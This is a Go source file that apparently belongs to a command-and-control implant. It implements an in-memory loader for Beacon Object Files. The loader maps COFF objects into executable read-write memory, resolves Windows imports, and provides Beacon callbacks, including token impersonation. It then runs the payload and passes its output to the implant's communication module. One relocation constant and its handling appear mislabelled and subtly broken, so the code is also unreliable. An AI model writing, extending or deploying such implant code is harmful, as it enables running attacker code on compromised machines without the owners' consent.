//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"errors"
	"fmt"
	"implant/core/communication"
	"strings"
	"syscall"
	"unsafe"
)

// ==================== COFF 常量与结构体 ====================

const (
	IMAGE_FILE_MACHINE_AMD64 = 0x8664

	IMAGE_REL_AMD64_ADDR64NB = 0x0002 // 【修复】原值误写为 0x0001（0x0001 为 ADDR64）
	IMAGE_REL_AMD64_REL32    = 0x0004
	IMAGE_REL_AMD64_REL32_1  = 0x0005
	IMAGE_REL_AMD64_REL32_2  = 0x0006
	IMAGE_REL_AMD64_REL32_3  = 0x0007
	IMAGE_REL_AMD64_REL32_4  = 0x0008
	IMAGE_REL_AMD64_REL32_5  = 0x0009
)

type coffFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type coffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type sectionInfo struct {
	allocBase uintptr
	rawData   []byte
	relocs    []coffRelocation
}

// ==================== Beacon API 回调实现 ====================

var (
	bofOutput strings.Builder
	bofParser struct {
		buffer []byte
		offset int
	}
)

// Beacon 输出类型
const (
	CALLBACK_OUTPUT     = 0x0
	CALLBACK_ERROR      = 0x0d
	CALLBACK_OUTPUT_OEM = 0x1e
)

// beaconPrintfCb BeaconPrintf 回调(最多处理4个参数,覆盖大多数 BOF)
func beaconPrintfCb(cbType, fmtPtr, arg1, arg2 uintptr) uintptr {
	if fmtPtr == 0 {
		return 0
	}
	fmtStr := readCString(fmtPtr)
	result := formatBeaconPrintf(fmtStr, arg1, arg2)
	bofOutput.WriteString(result)
	return 0
}

// formatBeaconPrintf 解析格式字符串并格式化(支持 %s %d %x %lu %ld %p %c %llX %ws)
func formatBeaconPrintf(fmtStr string, arg1, arg2 uintptr) string {
	args := []uintptr{arg1, arg2}
	argIdx := 0
	var b strings.Builder
	i := 0
	for i < len(fmtStr) {
		if fmtStr[i] != '%' {
			b.WriteByte(fmtStr[i])
			i++
			continue
		}
		i++
		if i >= len(fmtStr) {
			b.WriteByte('%')
			break
		}
		// 解析格式说明符
		spec := string(fmtStr[i])
		// 处理长度修饰
		if spec == "l" && i+1 < len(fmtStr) {
			i++
			spec = string(fmtStr[i])
		}
		switch spec {
		case "s":
			if argIdx < len(args) && args[argIdx] != 0 {
				b.WriteString(readCString(args[argIdx]))
			} else {
				b.WriteString("(null)")
			}
			argIdx++
		case "d", "i":
			if argIdx < len(args) {
				b.WriteString(fmt.Sprintf("%d", int32(args[argIdx])))
			}
			argIdx++
		case "u":
			if argIdx < len(args) {
				b.WriteString(fmt.Sprintf("%d", uint32(args[argIdx])))
			}
			argIdx++
		case "x":
			if argIdx < len(args) {
				b.WriteString(fmt.Sprintf("%x", uint32(args[argIdx])))
			}
			argIdx++
		case "X":
			if argIdx < len(args) {
				b.WriteString(fmt.Sprintf("%X", uint32(args[argIdx])))
			}
			argIdx++
		case "p":
			if argIdx < len(args) {
				b.WriteString(fmt.Sprintf("0x%x", args[argIdx]))
			}
			argIdx++
		case "c":
			if argIdx < len(args) {
				b.WriteByte(byte(args[argIdx]))
			}
			argIdx++
		case "%":
			b.WriteByte('%')
		default:
			b.WriteByte('%')
			b.WriteByte(fmtStr[i])
		}
		i++
	}
	return b.String()
}

// beaconOutputCb BeaconOutput 回调
func beaconOutputCb(outType, dataPtr, dataLen uintptr) uintptr {
	if dataPtr != 0 && dataLen > 0 {
		data := readBytes(dataPtr, int(dataLen))
		bofOutput.Write(data)
	}
	return 0
}

// beaconDataParseCb BeaconDataParse 回调(初始化参数解析器)
func beaconDataParseCb(parserPtr, bufferPtr, size uintptr) uintptr {
	if parserPtr == 0 || bufferPtr == 0 {
		return 0
	}
	// 写入 datap 结构体: {original, buffer, length, size}
	parser := (*[32]byte)(unsafe.Pointer(parserPtr))
	// original = buffer
	binary.LittleEndian.PutUint64(parser[0:8], uint64(bufferPtr))
	// buffer = buffer
	binary.LittleEndian.PutUint64(parser[8:16], uint64(bufferPtr))
	// length = 0
	binary.LittleEndian.PutUint32(parser[16:20], 0)
	// size = size
	binary.LittleEndian.PutUint32(parser[20:24], uint32(size))
	// 设置全局解析器
	bofParser.buffer = readBytes(bufferPtr, int(size))
	bofParser.offset = 0
	return 0
}

// beaconDataIntCb BeaconDataInt 回调(读取4字节int)
func beaconDataIntCb(parserPtr uintptr) uintptr {
	if bofParser.offset+4 > len(bofParser.buffer) {
		return 0
	}
	val := binary.LittleEndian.Uint32(bofParser.buffer[bofParser.offset : bofParser.offset+4])
	bofParser.offset += 4
	// 更新 parser 结构体的 length 字段
	if parserPtr != 0 {
		parser := (*[32]byte)(unsafe.Pointer(parserPtr))
		binary.LittleEndian.PutUint32(parser[16:20], uint32(bofParser.offset))
	}
	return uintptr(val)
}

// beaconDataShortCb BeaconDataShort 回调(读取2字节short)
func beaconDataShortCb(parserPtr uintptr) uintptr {
	if bofParser.offset+2 > len(bofParser.buffer) {
		return 0
	}
	val := binary.LittleEndian.Uint16(bofParser.buffer[bofParser.offset : bofParser.offset+2])
	bofParser.offset += 2
	if parserPtr != 0 {
		parser := (*[32]byte)(unsafe.Pointer(parserPtr))
		binary.LittleEndian.PutUint32(parser[16:20], uint32(bofParser.offset))
	}
	return uintptr(val)
}

// beaconDataExtractCb BeaconDataExtract 回调(读取长度前缀字符串)
func beaconDataExtractCb(parserPtr, sizePtr uintptr) uintptr {
	if bofParser.offset+4 > len(bofParser.buffer) {
		return 0
	}
	strLen := binary.LittleEndian.Uint32(bofParser.buffer[bofParser.offset : bofParser.offset+4])
	bofParser.offset += 4
	if bofParser.offset+int(strLen) > len(bofParser.buffer) {
		return 0
	}
	strData := bofParser.buffer[bofParser.offset : bofParser.offset+int(strLen)]
	bofParser.offset += int(strLen)
	// 分配内存存放字符串(BOF 期望可读的 char*)
	strPtr := allocString(strData)
	if sizePtr != 0 {
		*(*uint32)(unsafe.Pointer(sizePtr)) = strLen
	}
	if parserPtr != 0 {
		parser := (*[32]byte)(unsafe.Pointer(parserPtr))
		binary.LittleEndian.PutUint32(parser[16:20], uint32(bofParser.offset))
	}
	return strPtr
}

// 【阶段三-2】BOF token API 完整实现：
// BeaconIsAdmin: OpenProcessToken + GetTokenInformation(TokenElevation)
// BeaconUseToken: ImpersonateLoggedOnUser 模拟指定 token
// BeaconRevertToken: RevertToSelf 恢复

var (
	bofAdvapi32      = syscall.NewLazyDLL("advapi32.dll")
	bofOpenProcToken = bofAdvapi32.NewProc("OpenProcessToken")
	bofGetTokInfo    = bofAdvapi32.NewProc("GetTokenInformation")
	bofImpersonate   = bofAdvapi32.NewProc("ImpersonateLoggedOnUser")
	bofRevert        = bofAdvapi32.NewProc("RevertToSelf")
	bofCloseHandle   = syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle")
)

const (
	bofTokenQuery       = 0x0008
	bofTokenElevation   = 20 // TokenElevation
)

// beaconIsAdminCb BeaconIsAdmin 回调：检查当前进程 token 是否提升
func beaconIsAdminCb() uintptr {
	hProc, _ := syscall.GetCurrentProcess()
	var token uintptr
	ret, _, _ := bofOpenProcToken.Call(uintptr(hProc), bofTokenQuery, uintptr(unsafe.Pointer(&token)))
	if ret == 0 || token == 0 {
		return 0
	}
	defer bofCloseHandle.Call(token)

	var elevation uint32
	var retLen uint32
	ret, _, _ = bofGetTokInfo.Call(token, bofTokenElevation, uintptr(unsafe.Pointer(&elevation)), 4, uintptr(unsafe.Pointer(&retLen)))
	if ret == 0 {
		return 0
	}
	if elevation != 0 {
		return 1
	}
	return 0
}

// beaconUseTokenCb BeaconUseToken 回调：模拟指定 token
func beaconUseTokenCb(token uintptr) uintptr {
	if token == 0 {
		return 0
	}
	ret, _, _ := bofImpersonate.Call(token)
	if ret == 0 {
		return 0
	}
	return 1
}

// beaconRevertTokenCb BeaconRevertToken 回调：恢复自身 token
func beaconRevertTokenCb() uintptr {
	ret, _, _ := bofRevert.Call()
	if ret == 0 {
		return 0
	}
	return 1
}

// beaconGetSpawnToCb BeaconGetSpawnTo 回调
func beaconGetSpawnToCb(bufPtr, length uintptr) uintptr {
	if bufPtr != 0 && length > 0 {
		spawnTo := []byte("C:\\Windows\\System32\\cmd.exe\x00")
		copy(readBytes(bufPtr, int(length)), spawnTo)
	}
	return 0
}

// toWideCharCb toWideChar 回调
func toWideCharCb(srcPtr, dstPtr, max uintptr) uintptr {
	if srcPtr == 0 || dstPtr == 0 {
		return 0
	}
	src := readCString(srcPtr)
	wide := []uint16{}
	for _, c := range src {
		wide = append(wide, uint16(c))
	}
	wide = append(wide, 0)
	if uintptr(len(wide)*2) > max {
		wide = wide[:max/2]
	}
	for i, w := range wide {
		*(*uint16)(unsafe.Pointer(dstPtr + uintptr(i*2))) = w
	}
	return uintptr(len(wide))
}

// ==================== Beacon API 回调地址注册 ====================

var beaconCallbacks map[string]uintptr

func initBeaconCallbacks() {
	beaconCallbacks = make(map[string]uintptr)
	beaconCallbacks["BeaconPrintf"] = syscall.NewCallback(beaconPrintfCb)
	beaconCallbacks["BeaconOutput"] = syscall.NewCallback(beaconOutputCb)
	beaconCallbacks["BeaconDataParse"] = syscall.NewCallback(beaconDataParseCb)
	beaconCallbacks["BeaconDataInt"] = syscall.NewCallback(beaconDataIntCb)
	beaconCallbacks["BeaconDataShort"] = syscall.NewCallback(beaconDataShortCb)
	beaconCallbacks["BeaconDataExtract"] = syscall.NewCallback(beaconDataExtractCb)
	beaconCallbacks["BeaconIsAdmin"] = syscall.NewCallback(beaconIsAdminCb)
	beaconCallbacks["BeaconUseToken"] = syscall.NewCallback(beaconUseTokenCb)
	beaconCallbacks["BeaconRevertToken"] = syscall.NewCallback(beaconRevertTokenCb)
	beaconCallbacks["BeaconGetSpawnTo"] = syscall.NewCallback(beaconGetSpawnToCb)
	beaconCallbacks["toWideChar"] = syscall.NewCallback(toWideCharCb)
}

// ==================== 辅助函数 ====================

func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	// 【安全修复】限制最大读取长度，防止无效指针导致无界读取访问冲突
	const maxCStringLen = 4096
	var result []byte
	for i := uintptr(0); i < maxCStringLen; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + i))
		if b == 0 {
			break
		}
		result = append(result, b)
	}
	return string(result)
}

func readBytes(ptr uintptr, n int) []byte {
	if ptr == 0 || n <= 0 {
		return nil
	}
	result := make([]byte, n)
	for i := 0; i < n; i++ {
		result[i] = *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
	}
	return result
}

// allocString 分配内存存放字符串(BOF 期望返回的指针可读)
func allocString(data []byte) uintptr {
	if len(data) == 0 {
		return 0
	}
	size := uintptr(len(data) + 1)
	ptr, err := virtualAlloc(0, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return 0
	}
	for i, b := range data {
		*(*byte)(unsafe.Pointer(ptr + uintptr(i))) = b
	}
	*(*byte)(unsafe.Pointer(ptr + uintptr(len(data)))) = 0
	return ptr
}

// ==================== BOF 主执行函数 ====================

func ExecuteBof(coffBytes []byte, args string) ([]byte, error) {
	if len(coffBytes) < 20 {
		return nil, errors.New("BOF file too small")
	}

	// 初始化 Beacon API 回调
	if beaconCallbacks == nil {
		initBeaconCallbacks()
	}

	// 解析 COFF 文件头
	var header coffFileHeader
	header.Machine = binary.LittleEndian.Uint16(coffBytes[0:2])
	header.NumberOfSections = binary.LittleEndian.Uint16(coffBytes[2:4])
	header.PointerToSymbolTable = binary.LittleEndian.Uint32(coffBytes[12:16])
	header.NumberOfSymbols = binary.LittleEndian.Uint32(coffBytes[16:20])

	if header.Machine != IMAGE_FILE_MACHINE_AMD64 {
		return nil, fmt.Errorf("only AMD64 BOF supported, got 0x%04x", header.Machine)
	}

	// 【安全修复】COFF 头部字段边界校验：畸形 BOF 的 section/symbol 数量或偏移
	// 可导致超大内存分配或数组越界 panic（打崩 implant dispatch 线程）
	const maxBOFSections = 4096
	const maxBOFSymbols = 65536
	if header.NumberOfSections == 0 || header.NumberOfSections > maxBOFSections {
		return nil, fmt.Errorf("invalid BOF section count: %d", header.NumberOfSections)
	}
	if header.NumberOfSymbols > maxBOFSymbols {
		return nil, fmt.Errorf("invalid BOF symbol count: %d", header.NumberOfSymbols)
	}
	sectionsOffset := 20
	if sectionsOffset+int(header.NumberOfSections)*40 > len(coffBytes) {
		return nil, fmt.Errorf("BOF section table out of bounds")
	}
	if int(header.PointerToSymbolTable) < 0 || int(header.PointerToSymbolTable)+int(header.NumberOfSymbols)*18 > len(coffBytes) {
		return nil, fmt.Errorf("BOF symbol table out of bounds")
	}

	// 解析节区头
	sections := make([]coffSectionHeader, header.NumberOfSections)
	for i := uint16(0); i < header.NumberOfSections; i++ {
		off := sectionsOffset + int(i)*40
		copy((*[40]byte)(unsafe.Pointer(&sections[i]))[:], coffBytes[off:off+40])
	}

	// 解析符号表
	symbolsOffset := int(header.PointerToSymbolTable)
	symbols := make([]coffSymbol, header.NumberOfSymbols)
	for i := uint32(0); i < header.NumberOfSymbols; i++ {
		off := symbolsOffset + int(i)*18
		copy((*[18]byte)(unsafe.Pointer(&symbols[i]))[:], coffBytes[off:off+18])
	}

	// 读取字符串表
	stringTableOffset := symbolsOffset + int(header.NumberOfSymbols)*18
	var stringTable []byte
	if stringTableOffset < len(coffBytes) {
		stringTable = coffBytes[stringTableOffset:]
	}

	// 分配内存
	secInfos := make([]sectionInfo, header.NumberOfSections)
	totalSize := uintptr(0)
	for i := uint16(0); i < header.NumberOfSections; i++ {
		totalSize += uintptr(sections[i].SizeOfRawData)
	}
	allocSize := totalSize + 0x1000
	memory, err := virtualAlloc(0, allocSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAlloc failed: %v", err)
	}
	defer virtualFree(memory, 0, MEM_RELEASE)

	// 复制节区数据并解析重定位
	currentOffset := uintptr(0)
	for i := uint16(0); i < header.NumberOfSections; i++ {
		secSize := uintptr(sections[i].SizeOfRawData)
		if secSize == 0 {
			continue
		}
		rawOffset := int(sections[i].PointerToRawData)
		if rawOffset+int(secSize) > len(coffBytes) {
			continue
		}
		secInfos[i].allocBase = memory + currentOffset
		secInfos[i].rawData = coffBytes[rawOffset : rawOffset+int(secSize)]
		copy((*[1 << 20]byte)(unsafe.Pointer(secInfos[i].allocBase))[:secSize], secInfos[i].rawData)

		relocCount := sections[i].NumberOfRelocations
		relocOffset := int(sections[i].PointerToRelocations)
		// 【安全修复】重定位表越界检查（每项 10 字节）
		if relocCount > 0 && (relocOffset < 0 || relocOffset+int(relocCount)*10 > len(coffBytes)) {
			continue
		}
		secInfos[i].relocs = make([]coffRelocation, relocCount)
		for j := uint16(0); j < relocCount; j++ {
			roff := relocOffset + int(j)*10
			secInfos[i].relocs[j].VirtualAddress = binary.LittleEndian.Uint32(coffBytes[roff : roff+4])
			secInfos[i].relocs[j].SymbolTableIndex = binary.LittleEndian.Uint32(coffBytes[roff+4 : roff+8])
			secInfos[i].relocs[j].Type = binary.LittleEndian.Uint16(coffBytes[roff+8 : roff+10])
		}
		currentOffset += secSize
		currentOffset = (currentOffset + 0xF) &^ 0xF
	}

	// 处理重定位
	for i := uint16(0); i < header.NumberOfSections; i++ {
		for _, reloc := range secInfos[i].relocs {
			if int(reloc.SymbolTableIndex) >= len(symbols) {
				continue
			}
			sym := symbols[reloc.SymbolTableIndex]
			symName := getSymbolName(sym, stringTable)
			symAddr, err := resolveSymbol(symName, sym, secInfos)
			if err != nil {
				continue
			}
			relocAddr := secInfos[i].allocBase + uintptr(reloc.VirtualAddress)
			applyRelocation(reloc.Type, relocAddr, symAddr, secInfos[i].allocBase)
		}
	}

	// 查找入口符号 "go"
	entryPoint := uintptr(0)
	for i := uint32(0); i < header.NumberOfSymbols; i++ {
		symName := getSymbolName(symbols[i], stringTable)
		if symName == "go" && symbols[i].SectionNumber > 0 {
			secIdx := int(symbols[i].SectionNumber) - 1
			if secIdx >= 0 && secIdx < len(secInfos) {
				entryPoint = secInfos[secIdx].allocBase + uintptr(symbols[i].Value)
			}
		}
	}
	if entryPoint == 0 {
		return nil, errors.New("BOF entry point 'go' not found")
	}

	// 构建 Beacon 参数格式: [4B total_len][4B arg1_len][arg1][4B arg2_len][arg2]...
	bofArgBuf := buildBeaconArgs(args)
	argPtr := uintptr(0)
	if len(bofArgBuf) > 0 {
		argPtr = allocString(bofArgBuf)
		defer virtualFree(argPtr, 0, MEM_RELEASE)
	}

	// 清空输出
	bofOutput.Reset()
	bofParser.buffer = nil
	bofParser.offset = 0

	// 调用 go(args, alen)
	_, _, _ = syscall.SyscallN(entryPoint, argPtr, uintptr(len(bofArgBuf)), 0)

	// 发送输出
	output := bofOutput.String()
	if len(output) > 0 {
		communication.DataProcess(0, []byte(output))
	}

	return []byte(fmt.Sprintf("BOF executed, output: %d bytes", len(output))), nil
}

// buildBeaconArgs 构建 Beacon 参数格式
func buildBeaconArgs(args string) []byte {
	if args == "" {
		return nil
	}
	parts := strings.Fields(args)
	// 计算总长度
	totalLen := uintptr(4) // total length field
	for _, p := range parts {
		totalLen += 4 + uintptr(len(p)) // arg_len + arg_data
	}
	buf := make([]byte, totalLen)
	binary.LittleEndian.PutUint32(buf[0:4], uint32(totalLen))
	offset := 4
	for _, p := range parts {
		binary.LittleEndian.PutUint32(buf[offset:offset+4], uint32(len(p)))
		offset += 4
		copy(buf[offset:offset+len(p)], p)
		offset += len(p)
	}
	return buf
}

// ==================== 符号解析 ====================

func getSymbolName(sym coffSymbol, stringTable []byte) string {
	if sym.Name[0] != 0 || sym.Name[1] != 0 || sym.Name[2] != 0 || sym.Name[3] != 0 {
		name := make([]byte, 8)
		copy(name, sym.Name[:])
		for i, b := range name {
			if b == 0 {
				return string(name[:i])
			}
		}
		return string(name)
	}
	offset := binary.LittleEndian.Uint32(sym.Name[4:8])
	if int(offset)+4 < len(stringTable) {
		strStart := int(offset)
		for i := strStart; i < len(stringTable); i++ {
			if stringTable[i] == 0 {
				return string(stringTable[strStart:i])
			}
		}
	}
	return ""
}

func resolveSymbol(name string, sym coffSymbol, secInfos []sectionInfo) (uintptr, error) {
	// 内部符号(节区内)
	if sym.SectionNumber > 0 && int(sym.SectionNumber) <= len(secInfos) {
		secIdx := int(sym.SectionNumber) - 1
		return secInfos[secIdx].allocBase + uintptr(sym.Value), nil
	}

	// 去除 __imp_ 前缀
	cleanName := name
	if strings.HasPrefix(cleanName, "__imp_") {
		cleanName = cleanName[6:]
	}

	// 1. 先检查是否是 Beacon 内置 API
	if addr, ok := beaconCallbacks[cleanName]; ok {
		return addr, nil
	}

	// 2. 检查是否是 Windows DLL 函数 (格式: DLL_Function)
	dllName, funcName, ok := parseBofSymbol(cleanName)
	if ok {
		dll := syscall.NewLazyDLL(dllName + ".dll")
		proc := dll.NewProc(funcName)
		if proc.Find() == nil {
			return proc.Addr(), nil
		}
	}

	return 0, fmt.Errorf("unresolved symbol: %s", name)
}

func parseBofSymbol(name string) (string, string, bool) {
	// 查找最后一个下划线作为分隔符
	idx := strings.LastIndex(name, "_")
	if idx <= 0 {
		return "", "", false
	}
	dllName := name[:idx]
	funcName := name[idx+1:]
	if dllName == "" || funcName == "" {
		return "", "", false
	}
	return dllName, funcName, true
}

// ==================== 重定位 ====================

func applyRelocation(relocType uint16, relocAddr, symAddr, sectionBase uintptr) {
	switch relocType {
	case IMAGE_REL_AMD64_ADDR64NB:
		*(*uintptr)(unsafe.Pointer(relocAddr)) = symAddr
	case IMAGE_REL_AMD64_REL32, IMAGE_REL_AMD64_REL32_1, IMAGE_REL_AMD64_REL32_2,
		IMAGE_REL_AMD64_REL32_3, IMAGE_REL_AMD64_REL32_4, IMAGE_REL_AMD64_REL32_5:
		delta := int32(int64(symAddr) - int64(relocAddr) - 4)
		addend := int32(0)
		switch relocType {
		case IMAGE_REL_AMD64_REL32_1:
			addend = -1
		case IMAGE_REL_AMD64_REL32_2:
			addend = -2
		case IMAGE_REL_AMD64_REL32_3:
			addend = -3
		case IMAGE_REL_AMD64_REL32_4:
			addend = -4
		case IMAGE_REL_AMD64_REL32_5:
			addend = -5
		}
		*(*int32)(unsafe.Pointer(relocAddr)) = delta + addend
	}
}

// ==================== 虚拟内存操作 ====================

const PAGE_READWRITE = 0x04

var procVirtualFree = kernel32.NewProc("VirtualFree")

func virtualAlloc(addr uintptr, size uintptr, allocType uintptr, protect uintptr) (uintptr, error) {
	r1, _, e := procVirtualAlloc.Call(addr, size, allocType, protect)
	if r1 == 0 {
		return 0, e
	}
	return r1, nil
}

func virtualFree(addr uintptr, size uintptr, freeType uintptr) error {
	r1, _, e := procVirtualFree.Call(addr, size, freeType)
	if r1 == 0 {
		return e
	}
	return nil
}
